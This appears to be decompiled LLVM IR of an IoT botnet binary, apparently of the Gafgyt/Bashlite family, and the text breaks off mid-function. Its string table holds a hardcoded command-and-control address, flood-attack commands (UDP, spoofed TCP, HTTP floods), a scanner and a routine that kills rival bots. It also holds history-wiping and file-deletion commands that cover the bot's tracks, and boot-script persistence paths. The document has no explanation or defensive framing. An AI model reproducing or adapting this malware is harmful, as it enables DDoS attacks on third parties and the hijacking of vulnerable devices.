@global_var_1fd54.584 = constant [18 x i8] c"Invalid flag \22%s\22\00"
@global_var_1fd68.586 = constant [10 x i8] c"pkill -9 \00"
@global_var_1e568.588 = constant [5 x i8] c"mips\00"
@global_var_1e570.589 = constant [7 x i8] c"mipsel\00"
@global_var_1e578.590 = constant [4 x i8] c"sh4\00"
@global_var_1e57c.591 = constant [4 x i8] c"x86\00"
@global_var_1e580.592 = constant [5 x i8] c"i686\00"
@global_var_1e588.593 = constant [4 x i8] c"ppc\00"
@global_var_1e58c.594 = constant [5 x i8] c"i586\00"
@global_var_1e594.595 = constant [8 x i8] c"jackmy*\00"
@global_var_1e59c.596 = constant [8 x i8] c"hackmy*\00"
@global_var_1e5a4.597 = constant [5 x i8] c"arm*\00"
@global_var_1e5ac.598 = constant [3 x i8] c"b1\00"
@global_var_1e5b0.599 = constant [3 x i8] c"b2\00"
@global_var_1e5b4.600 = constant [3 x i8] c"b3\00"
@global_var_1e5b8.601 = constant [3 x i8] c"b4\00"
@global_var_1e5bc.602 = constant [3 x i8] c"b5\00"
@global_var_1e5c0.603 = constant [3 x i8] c"b6\00"
@global_var_1e5c4.604 = constant [3 x i8] c"b7\00"
@global_var_1e5c8.605 = constant [3 x i8] c"b8\00"
@global_var_1e5cc.606 = constant [3 x i8] c"b9\00"
@global_var_1e5d0.607 = constant [17 x i8] c"busyboxterrorist\00"
@global_var_1e5e4.608 = constant [9 x i8] c"DFhxdhdf\00"
@global_var_1e5f0.609 = constant [10 x i8] c"dvrHelper\00"
@global_var_1e5fc.610 = constant [8 x i8] c"FDFDHFC\00"
@global_var_1e604.611 = constant [5 x i8] c"FEUB\00"
@global_var_1e60c.612 = constant [9 x i8] c"FTUdftui\00"
@global_var_1e618.613 = constant [9 x i8] c"GHfjfgvj\00"
@global_var_1e624.614 = constant [6 x i8] c"jhUOH\00"
@global_var_1e62c.615 = constant [9 x i8] c"JIPJIPJj\00"
@global_var_1e638.616 = constant [10 x i8] c"JIPJuipjh\00"
@global_var_1e644.617 = constant [10 x i8] c"kmyx86_64\00"
@global_var_1e650.618 = constant [10 x i8] c"lolmipsel\00"
@global_var_1e65c.619 = constant [8 x i8] c"RYrydry\00"
@global_var_1e664.620 = constant [5 x i8] c"tel*\00"
@global_var_1e66c.621 = constant [9 x i8] c"TwoFace*\00"
@global_var_1e678.622 = constant [9 x i8] c"UYyuyioy\00"
@global_var_1e684.623 = constant [5 x i8] c"wget\00"
@global_var_1e68c.624 = constant [7 x i8] c"x86_64\00"
@global_var_1e694.625 = constant [9 x i8] c"XDzdfxzf\00"
@global_var_1e6a0.626 = constant [5 x i8] c"xxb*\00"
@global_var_1e6ac.627 = constant i32 49
@global_var_1e6b0.628 = constant i32 50
@global_var_1e6b4.629 = constant i32 51
@global_var_1e6b8.630 = constant i32 52
@global_var_1e6bc.631 = constant i32 53
@global_var_1e6c0.632 = constant i32 54
@global_var_1e6c4.633 = constant i32 55
@global_var_1e6c8.634 = constant i32 56
@global_var_1e6cc.635 = constant i32 57
@global_var_1e6d0.636 = constant [3 x i8] c"10\00"
@global_var_1e6d4.637 = constant [3 x i8] c"11\00"
@global_var_1e6d8.638 = constant [3 x i8] c"12\00"
@global_var_1e6dc.639 = constant [3 x i8] c"13\00"
@global_var_1e6e0.640 = constant [3 x i8] c"14\00"
@global_var_1e6e4.641 = constant [3 x i8] c"15\00"
@global_var_1e6e8.642 = constant [3 x i8] c"16\00"
@global_var_1e6ec.643 = constant [3 x i8] c"17\00"
@global_var_1e6f0.644 = constant [3 x i8] c"18\00"
@global_var_1e6f4.645 = constant [3 x i8] c"19\00"
@global_var_1e6f8.646 = constant [3 x i8] c"20\00"
@global_var_1e6fc.647 = constant [6 x i8] c"hackz\00"
@global_var_1e704.648 = constant [5 x i8] c"bin*\00"
@global_var_1e70c.649 = constant [5 x i8] c"gtop\00"
@global_var_1e714.650 = constant [5 x i8] c"ftp*\00"
@global_var_1e71c.651 = constant [6 x i8] c"tftp*\00"
@global_var_1e724.652 = constant [7 x i8] c"botnet\00"
@global_var_1e72c.653 = constant [8 x i8] c"swatnet\00"
@global_var_1e734.654 = constant [8 x i8] c"ballpit\00"
@global_var_1e73c.655 = constant [8 x i8] c"fucknet\00"
@global_var_1e744.656 = constant [9 x i8] c"cracknet\00"
@global_var_1e750.657 = constant [8 x i8] c"weednet\00"
@global_var_1e758.658 = constant [7 x i8] c"gaynet\00"
@global_var_1e760.659 = constant [9 x i8] c"queernet\00"
@global_var_1e76c.660 = constant [8 x i8] c"ballnet\00"
@global_var_1e774.661 = constant [5 x i8] c"unet\00"
@global_var_1e77c.662 = constant [7 x i8] c"yougay\00"
@global_var_1e784.663 = constant [7 x i8] c"sttftp\00"
@global_var_1e78c.664 = constant [7 x i8] c"sstftp\00"
@global_var_1e794.665 = constant [7 x i8] c"sbtftp\00"
@global_var_1e79c.666 = constant [6 x i8] c"btftp\00"
@global_var_1e7a4.667 = constant [9 x i8] c"y0u1sg3y\00"
@global_var_1e7b0.668 = constant [6 x i8] c"bruv*\00"
@global_var_1e7b8.669 = constant [5 x i8] c"IoT*\00"
@global_var_1e7c0.670 = constant [16 x i8] c"208.67.1.179:23\00"
@global_var_2a090.671 = global [87 x i8*] [i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1e568.588, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1e570.589, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1e578.590, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1e57c.591, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1e580.592, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1e588.593, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1e58c.594, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1e58c.594, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1e594.595, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1e59c.596, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1e5a4.597, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1e5ac.598, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1e5b0.599, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1e5b4.600, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1e5b8.601, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1e5bc.602, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1e5c0.603, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1e5c4.604, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1e5c8.605, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1e5cc.606, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_1e5d0.607, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1e5e4.608, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1e5f0.609, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1e5fc.610, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1e604.611, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1e60c.612, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1e618.613, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1e624.614, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1e62c.615, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1e638.616, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1e644.617, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1e650.618, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1e568.588, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1e570.589, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1e65c.619, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1e664.620, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1e66c.621, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1e678.622, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1e684.623, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1e68c.624, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1e694.625, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1e6a0.626, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1e6a8.36, i32 0, i32 0), i8* bitcast (i32* @global_var_1e6ac.627 to i8*), i8* bitcast (i32* @global_var_1e6b0.628 to i8*), i8* bitcast (i32* @global_var_1e6b4.629 to i8*), i8* bitcast (i32* @global_var_1e6b8.630 to i8*), i8* bitcast (i32* @global_var_1e6bc.631 to i8*), i8* bitcast (i32* @global_var_1e6c0.632 to i8*), i8* bitcast (i32* @global_var_1e6c4.633 to i8*), i8* bitcast (i32* @global_var_1e6c8.634 to i8*), i8* bitcast (i32* @global_var_1e6cc.635 to i8*), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1e6d0.636, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1e6d4.637, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1e6d8.638, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1e6dc.639, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1e6e0.640, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1e6e4.641, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1e6e8.642, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1e6ec.643, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1e6f0.644, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1e6f4.645, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1e6f8.646, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1e6fc.647, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1e704.648, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1e70c.649, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1e714.650, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1e71c.651, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1e724.652, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1e72c.653, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1e734.654, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1e73c.655, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1e744.656, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1e750.657, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1e758.658, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1e760.659, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1e76c.660, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1e774.661, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1e77c.662, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1e784.663, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1e78c.664, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1e794.665, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1e79c.666, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1e7a4.667, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1e7b0.668, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1e7b8.669, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_1e7c0.670, i32 0, i32 0)]
@global_var_1fd74.673 = constant [11 x i8] c"pkill -9 \22\00"
@global_var_1fd80.675 = constant i32 34
@global_var_1fd84.677 = constant [22 x i8] c"history -c;history -w\00"
@global_var_1fd9c.679 = constant [30 x i8] c"cd /root;rm -rf .bash_history\00"
@global_var_1fdbc.681 = constant [21 x i8] c"cd /var/tmp; rm -f *\00"
@global_var_1fdfc.683 = constant [62 x i8] c"Mozilla/5.0 (compatible; Konqueror/3.0; i686 Linux; 20021117)\00"
@global_var_1fe3c.684 = constant [64 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5\00"
@global_var_1fe7c.685 = constant [144 x i8] c"Mozilla/5.0 (iPhone; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10\00"
@global_var_1ff0c.686 = constant [55 x i8] c"Mozilla/5.0 Galeon/1.0.3 (X11; Linux i686; U;) Gecko/0\00"
@global_var_1ff44.687 = constant [32 x i8] c"Opera/6.04 (Windows XP; U) [en]\00"
@global_var_1ff64.688 = constant [24 x i8] c"Opera/9.99 (X11; U; sk)\00"
@global_var_1ff7c.689 = constant [86 x i8] c"Mozilla/6.0 (Future Star Technologies Corp. Star-Blade OS; U; en-US) iNet Browser 2.5\00"
@global_var_1fdd4.698 = constant [6 x i8] c"close\00"
@global_var_1fddc.699 = constant [11 x i8] c"keep-alive\00"
@global_var_1fde8.700 = constant [7 x i8] c"accept\00"
@global_var_1fdf0.701 = constant [3 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1fdd4.698, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1fddc.699, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1fde8.700, i32 0, i32 0)]
@global_var_1fff0.707 = constant [62 x i8] c"%s %s HTTP/1.1\0D\0AConnection: %s\0D\0AAccept: */*\0D\0AUser-Agent: %s\0D\0A\00"
@global_var_20040.713 = constant [3 x i8*] [i8* getelementptr inbounds ([32 x i8], [32 x i8]* @global_var_1ff44.687, i32 0, i32 0), i8* getelementptr inbounds ([24 x i8], [24 x i8]* @global_var_1ff64.688, i32 0, i32 0), i8* getelementptr inbounds ([86 x i8], [86 x i8]* @global_var_1ff7c.689, i32 0, i32 0)]
@global_var_2004c.718 = constant [64 x i8] c"%s %s HTTP/1.1\0D\0AHost: %s\0D\0AUser-Agent: %s\0D\0AConnection: close\0D\0A\0D\0A\00"
@global_var_2008c.722 = constant [6 x i8] c"PONG!\00"
@global_var_20094.724 = constant [6 x i8] c"TABLE\00"
@global_var_2009c.726 = constant [3 x i8] c"%d\00"
@global_var_200a0.728 = constant [8 x i8] c"SCANNER\00"
@global_var_200a8.730 = constant [4 x i8] c"OFF\00"
@global_var_30794.732 = global i32 0
@global_var_200ac.734 = constant [17 x i8] c"STOPPING SCANNER\00"
@global_var_200c0.736 = constant [3 x i8] c"ON\00"
@global_var_200c4.739 = constant [26 x i8] c"STARTING SCANNER ON -> %s\00"
@global_var_200e0.741 = constant [8 x i8] c"REMOVER\00"
@global_var_200e8.743 = constant [29 x i8] c"COMMENCING BOT KILL ON -> %s\00"
@global_var_20108.745 = constant [12 x i8] c"GETPUBLICIP\00"
@global_var_20114.747 = constant [17 x i8] c"My Public IP: %s\00"
@global_var_20128.749 = constant [4 x i8] c"UDP\00"
@global_var_2012c.751 = constant [113 x i8] c"UDP <target> <port (0 for random)> <time> <netmask> <packet size> <poll interval> <sleep check> <sleep time(ms)>\00"
@global_var_201a0.754 = constant [4 x i8] c"TCP\00"
@global_var_201a4.756 = constant [186 x i8] c"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)\00"
@global_var_20260.758 = constant [5 x i8] c"HTTP\00"
@global_var_20268.760 = constant [10 x i8] c"HTTPFLOOD\00"
@global_var_20274.762 = constant [4 x i8] c"CNC\00"
@global_var_20278.764 = constant [27 x i8] c"CNC <target> <port> <time>\00"
@global_var_20294.766 = constant [4 x i8] c"STD\00"
@global_var_20298.768 = constant [27 x i8] c"STD <target> <port> <time>\00"
@global_var_202b4.770 = constant [9 x i8] c"KILLATTK\00"
@global_var_202c0.774 = constant [11 x i8] c"Killed %d.\00"
@global_var_202cc.776 = constant [13 x i8] c"None Killed.\00"
@global_var_202dc.778 = constant [10 x i8] c"LOLNOGTFO\00"
@global_var_2a1ec.781 = local_unnamed_addr global i32 -1
@global_var_2a1e8.783 = global [16 x i8]* @global_var_1e7c0.670
@global_var_202e8.785 = constant [8 x i8] c"8.8.8.8\00"
@global_var_202f0.788 = constant [16 x i8] c"/proc/net/route\00"
@global_var_20300.790 = constant [11 x i8] c"\0900000000\09\00"
@global_var_2a540.792 = global i32 0
@global_var_2030c.794 = constant [9 x i8] c"TOXICNET\00"
@global_var_20318.796 = constant i32 0
@global_var_2031c.798 = constant [19 x i8] c"/etc/rc.d/rc.local\00"
@1 = constant i32 114
@global_var_20334.802 = constant [13 x i8] c"/etc/rc.conf\00"
@global_var_20344.804 = constant i32 47
@global_var_20348.806 = constant [8 x i8] c"\22%s%s\22\0A\00"
@global_var_20350.808 = constant i32 97
@global_var_20354.810 = constant [13 x i8] c"fork failed\0A\00"
@global_var_20364.814 = constant [12 x i8] c"BUILD %s:%s\00"
@global_var_20370.819 = constant [5 x i8] c"PONG\00"
@global_var_20378.821 = constant [4 x i8] c"DUP\00"
@global_var_2037c.823 = constant [20 x i8] c"PEACE OUT IMMA DUP\0A\00"
@global_var_20390.825 = constant [3 x i8] c"SH\00"
@global_var_20394.827 = constant [8 x i8] c"%s 2>&1\00"
@global_var_2039c.829 = constant [3 x i8] c"%s\00"
@global_var_203a0.831 = constant i32 32
@global_var_2a010.835 = global i32 0
@global_var_14da4.846 = constant i32 -382906384
@global_var_16e04.850 = constant i32 -382909968
@global_var_20003.856 = constant [43 x i8] c"nection: %s\0D\0AAccept: */*\0D\0AUser-Agent: %s\0D\0A\00"
@global_var_20000.857 = constant [46 x i8] c"Connection: %s\0D\0AAccept: */*\0D\0AUser-Agent: %s\0D\0A\00"
@global_var_137f0.867 = constant i32 -509607926
@global_var_139c0.877 = constant i32 -382910448
@global_var_19550.878 = constant i32 -382909968
@global_var_19604.879 = constant i32 -382910224
@global_var_14b14.913 = constant i32 -509607928
@global_var_151bc.940 = constant i32 -456978431
@global_var_15f28.976 = constant i32 -478871519
@global_var_16874.985 = constant i32 -478805983
@global_var_16c50.994 = constant i32 -382906384
@global_var_13180.1003 = constant i32 -509591552
@global_var_17210.1008 = constant i32 -442564540
@global_var_1f31d.1038 = constant [8 x i8] c"1.%d.%d\00"
@global_var_17ab8.1051 = constant i32 -494075872
@global_var_131ac.1052 = constant i32 -382910336
@global_var_17c78.1064 = constant i32 -369098421
@global_var_17080.1085 = constant i32 -442543860
@global_var_15270.1094 = constant i32 -369093530
@global_var_18740.1107 = constant i32 -335545191
@global_var_18d00.1122 = constant i32 -443088884
@global_var_f000.1126 = constant i32 436207625
@global_var_1b4f4.1172 = constant i32 -382909456
@global_var_131e4.1195 = constant i32 -382910336
@global_var_1c958.1200 = constant i32 -442695584
@global_var_1cf20.1209 = constant i32 -382910224
@global_var_1dd74.1235 = constant i32 -504313148
@global_var_1dd5c.1236 = constant i32 -483131392
@global_var_1dc08.1237 = constant i32 -481229311
@global_var_1dde4.1238 = constant i32 -477817729
@global_var_1dee4.1239 = constant i32 -476034303
@global_var_1e120.1240 = constant i32 -516685812
@global_var_1e014.1241 = constant i32 -905969571
@global_var_1df48.1242 = constant i32 -528203771
@global_var_1e1a8.1243 = constant i32 -478079873
@global_var_1e18c.1244 = constant i32 -534704125
@global_var_1e13c.1245 = constant i32 -534704125
@global_var_1e0d4.1246 = constant i32 -483131392
@global_var_2a510.3 = external global i8*
@global_var_2a549.78 = local_unnamed_addr global i8 0
@global_var_2a54a.79 = local_unnamed_addr global i8 0
@global_var_105a4.705 = constant i64 562883688211603
@global_var_20330.800 = constant [2 x i8] c"r\00"

declare void @__pseudo_branch(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @_init() local_unnamed_addr {
entry:
  %v3_80b8 = load i32, i32* @r4, align 4
  call void @__pseudo_branch(i32 %v3_80b8)
  %v31_80c0 = load i32, i32* @r0, align 4
  ret i32 %v31_80c0
}

define i32 @_call_via_r0(i32 %arg1) local_unnamed_addr {
entry:
  call void @__pseudo_branch(i32 %arg1)
  ret i32 %arg1
}

define i32 @_call_via_r1(i32 %arg1) local_unnamed_addr {
entry:
  call void @__pseudo_branch(i32 %arg1)
  %v1_80d4 = load i32, i32* @r0, align 4
  ret i32 %v1_80d4
}

define i32 @_call_via_r2(i32 %arg1) local_unnamed_addr {
entry:
  call void @__pseudo_branch(i32 %arg1)
  %v1_80d8 = load i32, i32* @r0, align 4
  ret i32 %v1_80d8
}

define i32 @_call_via_r3(i32 %arg1) local_unnamed_addr {
entry:
  call void @__pseudo_branch(i32 %arg1)
  %v1_80dc = load i32, i32* @r0, align 4
  ret i32 %v1_80dc
}

define i32 @_call_via_r4() local_unnamed_addr {
entry:
  %v0_80e0 = load i32, i32* @r4, align 4
  call void @__pseudo_branch(i32 %v0_80e0)
  %v1_80e0 = load i32, i32* @r0, align 4
  ret i32 %v1_80e0
}

define i32 @_call_via_r5() local_unnamed_addr {
entry:
  %v0_80e4 = load i32, i32* @r5, align 4
  call void @__pseudo_branch(i32 %v0_80e4)
  %v1_80e4 = load i32, i32* @r0, align 4
  ret i32 %v1_80e4
}

define i32 @_call_via_r6() local_unnamed_addr {
entry:
  %v0_80e8 = load i32, i32* @r6, align 4
  call void @__pseudo_branch(i32 %v0_80e8)
  %v1_80e8 = load i32, i32* @r0, align 4
  ret i32 %v1_80e8
}

define i32 @_call_via_r7() local_unnamed_addr {
entry:
  %v0_80ec = load i32, i32* @r7, align 4
  call void @__pseudo_branch(i32 %v0_80ec)
  %v1_80ec = load i32, i32* @r0, align 4
  ret i32 %v1_80ec
}

define i32 @_call_via_r8() local_unnamed_addr {
entry:
  %v0_80f0 = load i32, i32* @r8, align 4
  call void @__pseudo_branch(i32 %v0_80f0)
  %v1_80f0 = load i32, i32* @r0, align 4
  ret i32 %v1_80f0
}

define i32 @_call_via_r9() local_unnamed_addr {
entry:
  %v0_80f4 = load i32, i32* @sb, align 4
  call void @__pseudo_branch(i32 %v0_80f4)
  %v1_80f4 = load i32, i32* @r0, align 4
  ret i32 %v1_80f4
}

define i32 @_call_via_sl() local_unnamed_addr {
entry:
  %v0_80f8 = load i32, i32* @sl, align 4
  call void @__pseudo_branch(i32 %v0_80f8)
  %v1_80f8 = load i32, i32* @r0, align 4
  ret i32 %v1_80f8
}

define i32 @_call_via_fp() local_unnamed_addr {
entry:
  %v0_80fc = load i32, i32* @fp, align 4
  call void @__pseudo_branch(i32 %v0_80fc)
  %v1_80fc = load i32, i32* @r0, align 4
  ret i32 %v1_80fc
}

define i32 @_call_via_ip() local_unnamed_addr {
entry:
  %v0_8100 = load i32, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v0_8100)
  %v1_8100 = load i32, i32* @r0, align 4
  ret i32 %v1_8100
}

define i32 @_call_via_sp() local_unnamed_addr {
entry:
  %v0_8104 = load i32, i32* @sp, align 4
  call void @__pseudo_branch(i32 %v0_8104)
  %v1_8104 = load i32, i32* @r0, align 4
  ret i32 %v1_8104
}

define i32 @_call_via_lr() local_unnamed_addr {
entry:
  %v1_8108 = load i32, i32* @r0, align 4
  ret i32 %v1_8108
}

define i32 @__do_global_dtors_aux() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_810c = load i32, i32* @r4, align 4
  store i32 %v3_810c, i32* %stack_var_-8, align 4
  store i32 ptrtoint (i8** @global_var_2a510.3 to i32), i32* %r4.global-to-local, align 4
  %v2_8114 = load i8, i8* bitcast (i8** @global_var_2a510.3 to i8*), align 4
  %v2_8118 = icmp eq i8 %v2_8114, 0
  br i1 %v2_8118, label %dec_label_pc_8120, label %dec_label_pc_813c

dec_label_pc_8120:                                ; preds = %entry
  call void @__pseudo_cond_branch(i1 false, i32 0)
  %v2_8138 = load i32, i32* %r4.global-to-local, align 4
  %v3_8138 = inttoptr i32 %v2_8138 to i8*
  store i8 1, i8* %v3_8138, align 1
  %v2_813c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_813c

dec_label_pc_813c:                                ; preds = %entry, %dec_label_pc_8120
  %v2_813c = phi i32 [ %v3_810c, %entry ], [ %v2_813c.pre, %dec_label_pc_8120 ]
  store i32 %v2_813c, i32* %r4.global-to-local, align 4
  ret i32 undef

; uselistorder directives
  uselistorder i8** @global_var_2a510.3, { 1, 0 }
  uselistorder label %dec_label_pc_813c, { 1, 0 }
}

define i32 @frame_dummy() local_unnamed_addr {
bb:
  call void @__pseudo_cond_branch(i1 false, i32 0)
  %v2_8174 = load i32, i32* @global_var_2a00c.13, align 4
  %v2_8178 = icmp eq i32 %v2_8174, 0
  br i1 %v2_8178, label %dec_label_pc_8190, label %dec_label_pc_8180

dec_label_pc_8180:                                ; preds = %bb
  call void @__pseudo_cond_branch(i1 false, i32 0)
  br label %dec_label_pc_8190

dec_label_pc_8190:                                ; preds = %bb, %dec_label_pc_8180
  ret i32 ptrtoint (i32* @global_var_2a00c.13 to i32)

; uselistorder directives
  uselistorder i32* @global_var_2a00c.13, { 1, 0 }
  uselistorder label %dec_label_pc_8190, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @_start(i32 %arg1, i32 %arg2) local_unnamed_addr #0 {
entry:
  %stack_var_4 = alloca i32, align 4
  %v4_81b8 = ptrtoint i32* %stack_var_4 to i32
  %v8_81d8 = call i32 @__uClibc_main(i32 ptrtoint (i32* @global_var_11df8.17 to i32), i32 %arg2, i32* nonnull %stack_var_4, i32 32948, i32 124248, i32 %arg1, i32 %v4_81b8)
  %v0_81dc = call i32 @abort()
  ret i32 %v0_81dc
}

define i32 @init_rand(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_81fc = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_81fc, i32* @global_var_2a54c.20, align 4
  %v1_821c = add i32 %v0_81fc, -1640531527
  store i32 %v1_821c, i32* @global_var_2a550.21, align 4
  %v1_8238 = add i32 %v0_81fc, 1013904242
  store i32 %v1_8238, i32* @global_var_2a554.22, align 4
  br label %dec_label_pc_8250

dec_label_pc_8250:                                ; preds = %entry, %dec_label_pc_8250
  %storemerge12 = phi i32 [ 3, %entry ], [ %v1_8294, %dec_label_pc_8250 ]
  store i32 %storemerge12, i32* %r0.global-to-local, align 4
  %tmp = mul i32 %storemerge12, 4
  %v5_8260 = add i32 %tmp, add (i32 ptrtoint (i32* @global_var_2a54c.20 to i32), i32 -12)
  %v6_8260 = inttoptr i32 %v5_8260 to i32*
  %v7_8260 = load i32, i32* %v6_8260, align 4
  %tmp10 = mul i32 %storemerge12, 4
  %v5_8270 = add i32 %tmp10, add (i32 ptrtoint (i32* @global_var_2a54c.20 to i32), i32 -8)
  %v6_8270 = inttoptr i32 %v5_8270 to i32*
  %v7_8270 = load i32, i32* %v6_8270, align 4
  %v2_8274 = xor i32 %storemerge12, -1640531527
  %v2_827c = xor i32 %v2_8274, %v7_8260
  %v2_8284 = xor i32 %v2_827c, %v7_8270
  %v5_828c = mul nuw nsw i32 %storemerge12, 4
  %v6_828c = add i32 %v5_828c, ptrtoint (i32* @global_var_2a54c.20 to i32)
  %v7_828c = inttoptr i32 %v6_828c to i32*
  store i32 %v2_8284, i32* %v7_828c, align 4
  %v1_8294 = add nuw nsw i32 %storemerge12, 1
  %v7_82ac = icmp slt i32 %v1_8294, 4096
  br i1 %v7_82ac, label %dec_label_pc_8250, label %dec_label_pc_82b0

dec_label_pc_82b0:                                ; preds = %dec_label_pc_8250
  %v1_82b8 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_82b8

; uselistorder directives
